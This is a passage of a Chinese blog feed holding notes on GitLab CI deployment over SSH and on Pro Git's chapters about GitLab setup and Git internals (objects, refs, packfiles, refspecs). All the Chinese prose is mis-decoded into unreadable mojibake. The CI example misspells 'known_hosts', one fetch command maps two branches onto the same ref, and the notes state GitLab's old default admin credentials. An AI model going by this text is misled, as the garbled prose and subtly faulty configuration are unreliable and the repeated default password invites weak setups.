href="#è¿œç¨‹æœåŠ¡å™¨éƒ¨ç½²" class="headerlink" title="è¿œç¨‹æœåŠ¡å™¨éƒ¨ç½²"></a>è¿œç¨‹æœåŠ¡å™¨éƒ¨ç½²</h2><p><a href="https://docs.gitlab.com/ee/ci/ssh_keys/">å®˜æ–¹å…³äº ssh</a></p><p>ä¸»è¦åŸç†å°±æ˜¯åˆ©ç”¨ ssh å°†æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœº (å³è¦å‘å¸ƒé¡¹ç›®çš„ä¸»æœº).</p><p>ç°åœ¨ gitlab runner æ‰€åœ¨ä¸»æœºç”Ÿæˆ ssh çš„å¯†é’¥å¯¹ï¼Œç„¶åå°†å…¬é’¥ä¼ ç»™é¡¹ç›®éƒ¨ç½²æ‰€åœ¨çš„ä¸»æœº:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ssh-keygen -t rsa -b 2048 -C <span class="hljs-string">&quot;email@example.com&quot;</span><br>$ scp -r id_rsa.pub root@1.2.3.4:/root/.ssh/authorized_keys<br></code></pre></td></tr></table></figure><p><code>.gitlab-ci.yml</code> æ–‡ä»¶å†…å®¹:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">job-deploy:<br>  stage: deploy<br>  before_script:<br>    - <span class="hljs-string">&#x27;which ssh-agent || ( yum update -y &amp;&amp; yum install openssh-client git -y )&#x27;</span><br>    - <span class="hljs-built_in">eval</span> $(ssh-agent -s)  <span class="hljs-comment"># ä¼šè¾“å‡ºä¸€äº›ç¯å¢ƒå˜é‡åŠå€¼</span><br>    - <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$SSH_PRIVATE_KEY</span>&quot;</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\r&#x27;</span> | ssh-add -<br>    - <span class="hljs-built_in">mkdir</span> -p ~/.ssh<br>    - <span class="hljs-built_in">chmod</span> 700 ~/.ssh   <span class="hljs-comment"># è¿™ä¸€éƒ¨åˆ†åœ¨å°†ç§é’¥æ”¾åœ¨ runner æ‰€åœ¨çš„æœåŠ¡å™¨</span><br>    - ssh-keyscan ... &gt;&gt; ~/.ssh/knon_hosts<br>    - <span class="hljs-built_in">chmod</span> 644 ~/.ssh/known_hosts<br>  script:<br>    - <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;start scp&#x27;</span><br>    - scp -r dist root@...<br></code></pre></td></tr></table></figure><h2 id="è°ƒè¯•æ‰‹æ®µ"><a href="#è°ƒè¯•æ‰‹æ®µ" class="headerlink" title="è°ƒè¯•æ‰‹æ®µ"></a>è°ƒè¯•æ‰‹æ®µ</h2>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-github-å’Œ-gitlab-çš„åŒºåˆ«</title>
    <link href="/2022/11/05/%E5%85%B3%E4%BA%8E-github-%E5%92%8C-gitlab-%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2022/11/05/%E5%85%B3%E4%BA%8E-github-%E5%92%8C-gitlab-%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>Github ä¸­åˆ›å»ºç§æœ‰ä»“åº“éœ€è¦æ”¶è´¹ï¼Œè€Œ Gitlab ä¸éœ€è¦.</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pro-Git-Notes</title>
    <link href="/2022/11/04/Pro-Git-Notes/"/>
    <url>/2022/11/04/Pro-Git-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬4ç« -Git-æœåŠ¡å™¨"><a href="#ç¬¬4ç« -Git-æœåŠ¡å™¨" class="headerlink" title="ç¬¬4ç«  Git æœåŠ¡å™¨"></a>ç¬¬4ç«  Git æœåŠ¡å™¨</h1><h2 id="4-8-GitLab"><a href="#4-8-GitLab" class="headerlink" title="4.8 GitLab"></a>4.8 GitLab</h2><h3 id="4-8-1-å®‰è£…"><a href="#4-8-1-å®‰è£…" class="headerlink" title="4.8.1 å®‰è£…"></a>4.8.1 å®‰è£…</h3><p>GitLab æ˜¯ä½¿ç”¨æ•°æ®åº“çš„ Web åº”ç”¨.</p><p>å¯ä»¥ä» <a href="https://bitnami.com/stack/gitlab">è¿™ä¸ªç½‘ç«™</a> ä¸‹è½½é•œåƒ.</p><h3 id="4-8-2-ç®¡ç†"><a href="#4-8-2-ç®¡ç†" class="headerlink" title="4.8.2 ç®¡ç†"></a>4.8.2 ç®¡ç†</h3><p>GitLab çš„ç®¡ç†ç•Œé¢ä½¿ç”¨è¿‡ Web è®¿é—®çš„.</p><p>åœ¨æµè§ˆå™¨ä¸­è¾“å…¥å®‰è£…æœ‰ GitLab çš„æœåŠ¡å™¨çš„ä¸»æœºåæˆ–è€… IP åœ°å€ï¼Œ ç„¶åä½¿ç”¨ç®¡ç†å‘˜èº«ä»½ç™»é™†.</p><p>é»˜è®¤ç”¨æˆ·åæ˜¯ <code>admin@local.host</code>. é»˜è®¤å¯†ç æ˜¯ <code>5iveL!fe</code></p><h1 id="ç¬¬10ç« -Git-å†…å¹•"><a href="#ç¬¬10ç« -Git-å†…å¹•" class="headerlink" title="ç¬¬10ç«  Git å†…å¹•"></a>ç¬¬10ç«  Git å†…å¹•</h1><p><code>.git</code> ç›®å½•ä¸‹çš„:</p><ul><li>description æ–‡ä»¶ä»…é™äº GitWeb ç¨‹åºä½¿ç”¨. </li><li>config æ–‡ä»¶åŒ…å«é…ç½®</li><li>info ç›®å½•åŒ…å«ä¸€ä¸ªå…¨å±€æ€§æ’é™¤æ–‡ä»¶, è®°å½•ä¸å¸Œæœ›æ”¾åœ¨ <code>.gitignore</code> æ–‡ä»¶ä¸­çš„å¿½ç•¥æ¨¡å¼.</li><li>hooks ç›®å½•åŒ…å«å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨é’©å­è„šæœ¬</li></ul><p>å‰©ä¸‹çš„é‡è¦æ–‡ä»¶æˆ–ç›®å½•:</p><ul><li>object ç›®å½•ï¼Œå­˜å‚¨ä¸ªäººæ•°æ®åº“çš„æ‰€æœ‰å†…å®¹, æ‰€æœ‰çš„å¯¹è±¡éƒ½åœ¨è¿™é‡Œ</li><li>refs ç›®å½•ï¼Œå­˜å‚¨æŒ‡é’ˆ, æŒ‡å‘æ•°æ®çš„æäº¤å¯¹è±¡</li><li>HEAD æ–‡ä»¶ï¼ŒæŒ‡å‘å·²æ£€å‡ºçš„åˆ†æ”¯</li><li>index æ–‡ä»¶ï¼ŒGit ç”¨æ¥ä¿å­˜æš‚å­˜åŒºä¿¡æ¯.</li></ul><h2 id="10-2-Git-å¯¹è±¡"><a href="#10-2-Git-å¯¹è±¡" class="headerlink" title="10.2 Git å¯¹è±¡"></a>10.2 Git å¯¹è±¡</h2><p>Git çš„æ ¸å¿ƒå°±æ˜¯ä¸€ä¸ªç®€å•çš„ â€œé”®-å€¼â€ æ•°æ®å­˜å‚¨.</p><p>ç”¨åˆ°çš„ä¸€ä¸ªå‘½ä»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;test content&#x27;</span> | git hash-object -w --stdin <br></code></pre></td></tr></table></figure><p><code>hash-object</code> è¡¨æ˜è¦ç”Ÿæˆä¸€ä¸ª blob å¯¹è±¡ï¼Œå…¶è¿”å›ä¸€ä¸ªå“ˆå¸Œå€¼ï¼Œ<code>-w</code> å‚æ•°è¡¨ç¤ºä¿å­˜è¿™ä¸ªå¯¹è±¡ï¼Œ<code>--stdin</code> è¡¨æ˜ä» stdin è·å–è¾“å…¥.</p><p>SHA-1 çš„æ•£åˆ—å€¼æ˜¯ 40 ä¸ªå­—ç¬¦çš„æ ¡éªŒå’Œ. å…¶ç”±å­˜å‚¨çš„å†…å®¹åŠ ä¸Šå¤´éƒ¨ä¿¡æ¯è®¡ç®—å¾—å‡º.</p><p>ç›¸åŒçš„å†…å®¹ä¼šå¾—åˆ°ç›¸åŒçš„æ•£åˆ—å€¼. è€Œè¿™ä¸ªæ•£åˆ—å€¼åªä¼šä¿å­˜ä¸€ä»½. å…¶åªå’Œæ–‡ä»¶å†…å®¹ç›¸å…³ï¼Œå’Œæ–‡ä»¶åæ— å…³. git ä¸ä¼šå­˜å‚¨æ–‡ä»¶å.</p><p>æ˜¾ç¤ºå†…å®¹çš„å‘½ä»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git cat-file -p å“ˆå¸Œå€¼<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>-p</code> å‚æ•°å¯èƒ½ä¸º <code>print</code>, <code>cat-file</code> åé¢å¿…é¡»åŠ ä¸€ä¸ªå‚æ•°.</p><p>ä½¿ç”¨ <code>-t</code> (type) å‚æ•°å¯ä»¥è·å–ç±»å‹.</p><h3 id="10-2-1-æ ‘å¯¹è±¡"><a href="#10-2-1-æ ‘å¯¹è±¡" class="headerlink" title="10.2.1 æ ‘å¯¹è±¡"></a>10.2.1 æ ‘å¯¹è±¡</h3><p>å…¶è§£å†³äº†å­˜å‚¨æ–‡ä»¶åçš„é—®é¢˜.</p><p>æ ‘å¯¹è±¡ç›¸å½“äºç›®å½•ï¼Œblob å¯¹è±¡ç›¸å½“äºæ–‡ä»¶å†…å®¹.</p><p><img src="/../img/git_tree_object.png"></p><p>åŒæ ·ç”¨ <code>cat-file</code> æŸ¥çœ‹æ ‘å¯¹è±¡å†…å®¹. å¦‚:<br><img src="/../img/content_of_git_tree_object.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå…¶ä¿å­˜äº†æ–‡ä»¶å. ä¹Ÿå°±æ˜¯è¯´ï¼Œåªæœ‰ <code>commit</code> ä¹‹åæ‰ä¼šä¿å­˜æ–‡ä»¶å. <code>add</code> åªèƒ½ä¿å­˜æ–‡ä»¶å†…å®¹.</p><p>åº•å±‚å‘½ä»¤å°†æ–‡ä»¶æ·»åŠ è‡³æš‚å­˜åŒº:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git update-index --add --cacheinfo 100644 \<br>  å“ˆå¸Œå€¼ æ–‡ä»¶å<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ â€œæ–‡ä»¶åâ€ å¯ä»¥å–å…¶ä»–çš„ï¼Œå…¶ä¼šæœ€ç»ˆå­˜å…¥æ ‘å¯¹è±¡ä¸­.</p><p>å…¶ä¼šä¿®æ”¹ <code>.git/index</code> æ–‡ä»¶çš„å†…å®¹ï¼Œ</p><p>å°†æ ‘å¯¹è±¡åŠ å…¥æš‚å­˜åŒºä½¿ç”¨ <code>read-tree</code> å‘½ä»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git read-tree --prefix=bak æ ‘å¯¹è±¡çš„å“ˆå¸Œå€¼<br>$ git write-tree<br></code></pre></td></tr></table></figure><p><code>--prefix</code> å‚æ•°å³è¿™ä¸ªæ ‘å¯¹è±¡å, è‡ªå·±å–å³å¯.</p><h3 id="10-2-2-æäº¤å¯¹è±¡"><a href="#10-2-2-æäº¤å¯¹è±¡" class="headerlink" title="10.2.2 æäº¤å¯¹è±¡"></a>10.2.2 æäº¤å¯¹è±¡</h3><p>åˆ›å»ºæäº¤å¯¹è±¡éœ€è¦ä½¿ç”¨ <code>commit-tree</code> å‘½ä»¤. éœ€æŒ‡æ˜ä¸€ä¸ªæ ‘å¯¹è±¡çš„å“ˆå¸Œå€¼å’Œçˆ¶æäº¤å¯¹è±¡ (å¦‚æœæœ‰).</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;first commit&#x27;</span> | git commit-tree å“ˆå¸Œå€¼<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;first commit&#x27;</span> | git commit-tree å“ˆå¸Œå€¼ -p çˆ¶æäº¤å“ˆå¸Œå€¼<br></code></pre></td></tr></table></figure><p>æäº¤å¯¹è±¡çš„æ ¼å¼:</p><ul><li>å¿«ç…§é¡¶å±‚æ ‘å¯¹è±¡</li><li>ä½œè€…ä¿¡æ¯ (user.name, user.email) å’Œæ—¶é—´æˆ³</li><li>ç©ºè¡Œ</li><li>æäº¤æ¶ˆæ¯</li></ul><h3 id="10-2-3-å¯¹è±¡å­˜å‚¨"><a href="#10-2-3-å¯¹è±¡å­˜å‚¨" class="headerlink" title="10.2.3 å¯¹è±¡å­˜å‚¨"></a>10.2.3 å¯¹è±¡å­˜å‚¨</h3><p>Git æ„é€ å‡ºä»¥å¯¹è±¡ç±»å‹ä½œä¸ºå¼€å¤´çš„å¤´éƒ¨ä¿¡æ¯:</p><ul><li>å¯¹è±¡ç±»å‹</li><li>ç©ºæ ¼</li><li>å†…å®¹çš„é•¿åº¦</li><li>ç©ºå­—èŠ‚</li></ul><p>Ruby ä»£ç :</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta prompt_">&gt;&gt;</span> header = <span class="hljs-string">&quot;blob <span class="hljs-subst">#&#123;content.length&#125;</span>\0&quot;</span><br></code></pre></td></tr></table></figure><p>Git å°†å¤´éƒ¨ä¿¡æ¯å’ŒåŸå§‹å†…å®¹æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œè®¡ç®— SHA-1 æ ¡éªŒå’Œ.</p><p>ç„¶åç”¨æ ¡éªŒå’Œçš„å‰ä¸¤ä½ä½œä¸ºå­ç›®å½•åï¼Œå‰©ä½™ä¸ºæ–‡ä»¶åï¼Œå°†åŸå§‹å†…å®¹ç”¨ zlib å‹ç¼©å¹¶å­˜å‚¨åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­.</p><p>å› æ­¤ï¼Œæ ¡éªŒå’Œåªæ˜¯æ ‡è®°è·¯å¾„ï¼Œå’Œå†…å®¹æ— å…³.</p><h2 id="10-3-Git-å¼•ç”¨"><a href="#10-3-Git-å¼•ç”¨" class="headerlink" title="10.3 Git å¼•ç”¨"></a>10.3 Git å¼•ç”¨</h2><p>Git ä¸­çš„ â€œå¼•ç”¨â€ (reference æˆ– ref) å°±æ˜¯ç”¨æ–‡ä»¶æ¥å­˜å‚¨ SHA-1 å€¼ï¼Œç„¶åå°†è¿™ä¸ªæ–‡ä»¶å½“ä½œä¸€ä¸ªæŒ‡é’ˆ.</p><p>ä½äº <code>.git/refs</code> ä¸‹.</p><p>æ›´æ–°æŸä¸ªå¼•ç”¨ï¼Œä½¿ç”¨ <code>update-ref</code> å‘½ä»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git update-ref refs/heads/master å“ˆå¸Œå€¼<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>git branch</code> è¿™æ ·çš„å‘½ä»¤ï¼ŒGit ä¼šä½¿ç”¨ <code>update-ref</code> å‘½ä»¤å°†å½“å‰åˆ†æ”¯ä¸­æœ€åä¸€æ¬¡æäº¤çš„ SHA-1 æ·»åŠ åˆ°ä½ è¦åˆ›å»ºçš„æ–°å¼•ç”¨ä¸­.</p><h3 id="10-3-1-HEAD"><a href="#10-3-1-HEAD" class="headerlink" title="10.3.1 HEAD"></a>10.3.1 HEAD</h3><p>HEAD æ–‡ä»¶æ˜¯ä¸€ä¸ªåˆ°å½“å‰æ‰€åœ¨åˆ†æ”¯çš„ç¬¦å·å¼•ç”¨.</p><p>æ‰§è¡Œ <code>git commit</code> å‘½ä»¤æ—¶ï¼Œè¯¥å‘½ä»¤ä¼šåˆ›å»ºä¸€ä¸ªæäº¤å¯¹è±¡ï¼Œå¹¶æŠŠè¯¥æäº¤å¯¹è±¡çš„çˆ¶å¯¹è±¡è®¾ç½®ä¸º HEAD æ–‡ä»¶ä¸­å¼•ç”¨æ‰€æŒ‡å‘çš„ SHA-1 å€¼. (å³å½“å‰åˆ†æ”¯)</p><p>å¯åˆ©ç”¨ <code>git symbolic-ref HEAD</code> å‘½ä»¤æ¥è¯»å– HEAD çš„å€¼.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git symbolic-ref HEAD<br></code></pre></td></tr></table></figure><p>è®¾ç½®:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git symbolic-ref HEAD refs/heads/test<br></code></pre></td></tr></table></figure><h3 id="10-3-2-æ ‡ç­¾å¯¹è±¡"><a href="#10-3-2-æ ‡ç­¾å¯¹è±¡" class="headerlink" title="10.3.2 æ ‡ç­¾å¯¹è±¡"></a>10.3.2 æ ‡ç­¾å¯¹è±¡</h3><p>æ ‡ç­¾å¯¹è±¡ä¸æäº¤å¯¹è±¡ç±»ä¼¼ï¼Œå…¶åŒ…å«:</p><ul><li>æ ‡ç­¾åˆ›å»ºè€…</li><li>ä¸€ä¸ªæ—¥æœŸ</li><li>ä¸€æ¡æ¶ˆæ¯</li><li>ä¸€ä¸ªæŒ‡é’ˆ</li></ul><p>ä½†æ ‡ç­¾å¯¹è±¡é€šå¸¸æŒ‡å‘çš„æ˜¯æäº¤å¯¹è±¡ï¼Œè€Œä¸æ˜¯æ ‘å¯¹è±¡.</p><p>æœ‰ä¸¤ç§ç±»å‹çš„æ ‡ç­¾:</p><ul><li>æ³¨é‡Šæ ‡ç­¾</li><li>è½»é‡æ ‡ç­¾</li></ul><p>åˆ›å»ºä¸€ä¸ªè½»é‡æ ‡ç­¾, å…¶ä¸ä¼šåˆ›å»ºæ ‡ç­¾å¯¹è±¡:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git update-ref refs/tags/v1.0 å“ˆå¸Œå€¼<br></code></pre></td></tr></table></figure><p><code>.git/refs/tags/v1.0</code> æ–‡ä»¶ä¸­çš„å†…å®¹æ˜¯æäº¤å¯¹è±¡çš„å“ˆå¸Œå€¼.</p><p>åˆ›å»ºä¸€ä¸ªæ³¨é‡Šæ ‡ç­¾ï¼Œå…¶ä¼šåˆ›å»ºä¸€ä¸ªæ ‡ç­¾å¯¹è±¡.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git tag -a v1.1 å“ˆå¸Œå€¼ -m <span class="hljs-string">&#x27;test tag&#x27;</span><br></code></pre></td></tr></table></figure><p><code>-a</code> å‚æ•°æŒ‡æ˜è¦åˆ›å»ºä¸€ä¸ªæ³¨é‡Šæ ‡ç­¾. </p><p><code>.git/refs/tags/v1.1</code> æ–‡ä»¶ä¸­çš„å†…å®¹æ˜¯æ ‡ç­¾å¯¹è±¡çš„å“ˆå¸Œå€¼.</p><h3 id="10-3-3-è¿œç¨‹å¼•ç”¨"><a href="#10-3-3-è¿œç¨‹å¼•ç”¨" class="headerlink" title="10.3.3 è¿œç¨‹å¼•ç”¨"></a>10.3.3 è¿œç¨‹å¼•ç”¨</h3><p>æ·»åŠ è¿œç¨‹ä»“åº“å¹¶å‘å…¶æ¨é€ï¼ŒGit ä¼šå°†æœ€åä¸€æ¬¡æ¨é€åˆ°è¯¥è¿œç¨‹ä»“åº“çš„æ¯ä¸€åˆ†æ”¯çš„å€¼ä¿å­˜åœ¨ <code>refs/remotes</code> ç›®å½•ä¸­.</p><p>è¿œç¨‹å¼•ç”¨ä¸åˆ†æ”¯ (refs&#x2F;heads ç›®å½•ä¸‹çš„å¼•ç”¨) çš„ä¸»è¦ä¸åŒåœ¨äºå‰è€…æ˜¯åªè¯»ï¼Œå¯ä»¥å¯¹å…¶ä½¿ç”¨ <code>git checkout</code>ï¼Œä½†æ˜¯ Git ä¸ä¼šä½¿ HEAD æŒ‡å‘å®ƒï¼Œå› æ­¤ä¹Ÿå°±æ— æ³•ä½¿ç”¨ commit å‘½ä»¤æ›´æ–°è¿œç¨‹å¼•ç”¨.</p><h2 id="10-4-åŒ…æ–‡ä»¶"><a href="#10-4-åŒ…æ–‡ä»¶" class="headerlink" title="10.4 åŒ…æ–‡ä»¶"></a>10.4 åŒ…æ–‡ä»¶</h2><p>æŸ¥çœ‹å¯¹è±¡çš„å¤§å°ç”¨ <code>git cat-file -s å“ˆå¸Œå€¼</code>.</p><p>ä¸€ä¸ªæ–‡ä»¶æäº¤åï¼Œä¿®æ”¹éƒ¨åˆ†å†…å®¹å†æ¬¡æäº¤ï¼Œæ–°çš„å¯¹è±¡å¹¶ä¸æ˜¯åªä¿å­˜å·®å¼‚.</p><p>Git åœ¨ç£ç›˜ä¸Šä¿å­˜å¯¹è±¡æ‰€é‡‡ç”¨çš„æ ¼å¼å«åš â€œæ¾æ•£å¼â€ å¯¹è±¡æ ¼å¼ï¼Œä½†æœ‰æ—¶ä¸ºäº†èŠ‚çœç£ç›˜ç©ºé—´å’Œæé«˜æ“ä½œæ•ˆç‡ï¼ŒGit ä¼šå°†æœ€ä¸ªè¿™ç§æ ¼å¼çš„å¯¹è±¡æ‰“åŒ…å¡è¿›ä¸€ä¸ªå«åš â€œåŒ…æ–‡ä»¶â€ çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ã€‚</p><p>å¯æ‰‹åŠ¨æ‰§è¡Œ <code>git gc</code> å‘½ä»¤è¦æ±‚ Git æ‰“åŒ…è¿™äº›å¯¹è±¡.</p><p>ä¸Šè¿°å‘½ä»¤ä¼šåˆ é™¤æäº¤äº†çš„å¯¹è±¡ï¼Œå¹¶åˆ›å»ºåŒ…æ–‡ä»¶å’Œç´¢å¼•æ–‡ä»¶ï¼Œ</p><ul><li>åŒ…æ–‡ä»¶ä¸­åŒ…å«äº†ä»æ–‡ä»¶ç³»ç»Ÿä¸­åˆ é™¤çš„æ‰€æœ‰å¯¹è±¡</li><li>ç´¢å¼•æ–‡ä»¶åŒ…å«äº†é’ˆå¯¹åŒ…æ–‡ä»¶å†…å®¹çš„åç§» (æ¯•ç«Ÿå‡ ä¸ªæ–‡ä»¶çš„å†…å®¹éƒ½æ”¾è¿›äº†ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè¦çŸ¥é“é‚£ä¸€éƒ¨åˆ†æ˜¯å“ªä¸€ä¸ªæ–‡ä»¶)</li></ul><p>æ‰“åŒ…å¯ä»¥è¿›ä¸€æ­¥å‹ç¼©ç©ºé—´ã€‚æ­¤æ—¶ Git ä¼šæŸ¥æ‰¾åç§°å’Œå¤§å°ç›¸è¿‘çš„æ–‡ä»¶ï¼Œåªä¿å­˜ä¸åŒç‰ˆæœ¬ä¹‹é—´çš„å·®å¼‚. ç¬¬äºŒä¸ªç‰ˆæœ¬å®Œæ•´åœ°ä¿å­˜äº†æ–‡ä»¶å†…å®¹ï¼Œè€ŒåŸå§‹ç‰ˆæœ¬æ˜¯ä»¥å·®å¼‚æ–¹å¼ä¿å­˜çš„ (æ¯•ç«Ÿå¤§éƒ¨åˆ†è®¿é—®çš„éƒ½æ˜¯æ–‡ä»¶çš„æœ€æ–°ç‰ˆæœ¬).</p><p>å¯ä»¥ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git verify-pack -v .git/objects/pack/pack-è¿™æ˜¯æ–‡ä»¶å<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ‰“åŒ…çš„å†…å®¹.</p><h2 id="10-5-å¼•ç”¨è§„æ ¼"><a href="#10-5-å¼•ç”¨è§„æ ¼" class="headerlink" title="10.5 å¼•ç”¨è§„æ ¼"></a>10.5 å¼•ç”¨è§„æ ¼</h2><p>è‹¥æ·»åŠ äº†ä¸€ä¸ªè¿œç¨‹ä»“åº“, å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git remote add origin https://github.com/schacom/simplegit-progit<br></code></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤ä¼šåœ¨ <code>.git/config</code> æ–‡ä»¶ä¸­æ·»åŠ å†…å®¹, åŒ…æ‹¬:</p><ul><li>è¿œç¨‹ä»“åº“åç§°ï¼Œå¦‚ origin</li><li>URL</li><li>ç”¨äºè·å–çš„å¼•ç”¨è§„æ ¼</li></ul><p>å¦‚:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">[remote <span class="hljs-string">&quot;origin&quot;</span>] <br>    url = https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/schacom/</span>simplegit-progit<br>    fetch = +refs<span class="hljs-regexp">/heads/</span>*:refs<span class="hljs-regexp">/remotes/</span>origin/*<br></code></pre></td></tr></table></figure><p><code>fetch</code> çš„æ ¼å¼ä¸º:</p><ul><li>å¯é€‰çš„ <code>+</code>, æŒ‡ç¤º Git æ›´æ–°å¼•ç”¨</li><li><code>&lt;src&gt;:&lt;dst&gt;</code>, <code>&lt;src&gt;</code> æ˜¯è¿œç¨‹ç«¯çš„å¼•ç”¨æ ·å¼, <code>&lt;dst&gt;</code> æ˜¯è¿œç¨‹å¼•ç”¨åœ¨æœ¬åœ°è¦å†™å…¥çš„ä½ç½®</li></ul><p>Git è·å–æœåŠ¡å™¨ç«¯ <code>refs/heads/</code> ä¸‹çš„æ‰€æœ‰å¼•ç”¨ï¼Œç„¶åå°†å…¶å†™å…¥åˆ°æœ¬åœ°çš„ <code>refs/remotes/origin/</code>.</p><p>å¯æŒ‡å®šå¤šä¸ªå¼•ç”¨è§„æ ¼ï¼Œå³æ‹‰å–å¤šä¸ªåˆ†æ”¯:</p><p>å‘½ä»¤å¦‚ä¸‹:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git fetch origin master:refs/remote/origin/mymaster \<br>    topic:refs/remote/origin/mymaster<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ <code>.git/config</code> æ–‡ä»¶:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">[remote <span class="hljs-string">&quot;origin&quot;</span>]<br>    url = https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/schacom/</span>simplegit-progit<br>    fetch = +refs<span class="hljs-regexp">/heads/m</span>aster:refs<span class="hljs-regexp">/remotes/</span>origin/master<br>    fetch = +refs<span class="hljs-regexp">/heads/</span>experiment:refs<span class="hljs-regexp">/remotes/</span>origin/experiment<br></code></pre></td></tr></table></figure><h3 id="10-5-1-æ¨é€å¼•ç”¨è§„æ ¼"><a href="#10-5-1-æ¨é€å¼•ç”¨è§„æ ¼" class="headerlink" title="10.5.1 æ¨é€å¼•ç”¨è§„æ ¼"></a>10.5.1 æ¨é€å¼•ç”¨è§„æ ¼</h3><p>å‘½ä»¤å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git push origin master:refs/heads/qa/master<br></code></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶ä¸º:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">[remote <span class="hljs-string">&quot;origin&quot;</span>]<br>    url = https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/schacom/</span>simplegit-progit<br>    fetch = +refs<span class="hljs-regexp">/heads/</span>*:refs<span class="hljs-regexp">/remotes/</span>origin/*<br>    push = refs<span class="hljs-regexp">/heads/m</span>aster:refs<span class="hljs-regexp">/heads/</span>qa/master<br></code></pre></td></tr></table></figure><h3 id="10-5-2-åˆ é™¤å¼•ç”¨"><a href="#10-5-2-åˆ é™¤å¼•ç”¨" class="headerlink" title="10.5.2 åˆ é™¤å¼•ç”¨"></a>10.5.2 åˆ é™¤å¼•ç”¨</h3><p>ä»è¿œç¨‹æœåŠ¡å™¨ä¸­åˆ é™¤å¼•ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git push origin :topic<br></code></pre></td></tr></table></figure><h2 id="10-6-ä¼ è¾“åè®®"><a href="#10-6-ä¼ è¾“åè®®" class="headerlink" title="10.6 ä¼ è¾“åè®®"></a>10.6 ä¼ 